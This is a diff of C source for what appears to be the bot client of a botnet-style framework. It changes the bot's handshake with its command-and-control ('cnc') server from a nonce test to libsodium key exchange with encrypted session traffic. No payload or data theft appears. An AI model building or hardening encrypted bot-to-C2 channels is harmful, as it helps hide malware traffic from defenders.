@@ -4,23 +4,15 @@
 #include "bot.h"
 
 LAIKAPKT_SIZE laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t) + LAIKAENC_SIZE(LAIKA_NONCESIZE)
+    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t)
 };
 
 void handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    uint8_t nonce[LAIKA_NONCESIZE];
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
     uint8_t endianness = laikaS_readByte(&peer->sock);
 
-    /* read & decrypt nonce */
-    laikaS_readENC(&peer->sock, nonce, LAIKA_NONCESIZE, bot->pub, bot->priv);
-
-    /* check nonce */
-    if (memcmp(nonce, bot->nonce, LAIKA_NONCESIZE) != 0)
-        LAIKA_ERROR("mismatched nonce!\n");
-
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
-    LAIKA_DEBUG("handshake accepted by cnc!\n")
+    LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n", (endianness ? "TRUE" : "FALSE"))
 }
 
 PeerPktHandler laikaB_handlerTbl[LAIKAPKT_MAXNONE] = {
@@ -38,7 +30,6 @@ struct sLaika_bot *laikaB_newBot(void) {
         &bot->pList,
         (void*)bot
     );
-    laikaS_setKeys(bot->peer, bot->priv, bot->pub);
 
     /* generate keypair */
     if (sodium_init() < 0) {
@@ -46,19 +37,17 @@ struct sLaika_bot *laikaB_newBot(void) {
         LAIKA_ERROR("LibSodium failed to initialize!\n");
     }
 
-    if (crypto_box_keypair(bot->pub, bot->priv) != 0) {
+    if (crypto_kx_keypair(bot->pub, bot->priv) != 0) {
         laikaB_freeBot(bot);
         LAIKA_ERROR("Failed to gen keypair!\n");
     }
 
     /* read cnc's public key into peerPub */
-    if (sodium_hex2bin(bot->peer->peerPub, crypto_box_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
+    if (sodium_hex2bin(bot->peer->peerPub, crypto_kx_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
         laikaB_freeBot(bot);
         LAIKA_ERROR("Failed to init cnc public key!\n");
     }
 
-    /* gen nonce test */
-    randombytes_buf(bot->nonce, LAIKA_NONCESIZE);
     return bot;
 }
 
@@ -78,13 +67,16 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaP_addSock(&bot->pList, sock);
 
     /* queue handshake request */
-    laikaS_writeByte(sock, LAIKAPKT_HANDSHAKE_REQ);
+    laikaS_startOutPacket(sock, LAIKAPKT_HANDSHAKE_REQ);
     laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
-    laikaS_writeByte(sock, PEER_BOT);
-    laikaS_writeENC(sock, bot->nonce, LAIKA_NONCESIZE, bot->peer->peerPub); /* write encrypted nonce test */
     laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
+    laikaS_endOutPacket(sock); /* force packet body to be plaintext */
+    laikaS_setSecure(sock, true); /* after the cnc receives our handshake, our packets will be encrypted */
+
+    if (crypto_kx_client_session_keys(bot->peer->sock.inKey, bot->peer->sock.outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
+        LAIKA_ERROR("failed to gen session key!\n")
 
     if (!laikaS_handlePeerOut(bot->peer))
         LAIKA_ERROR("failed to send handshake request!\n")
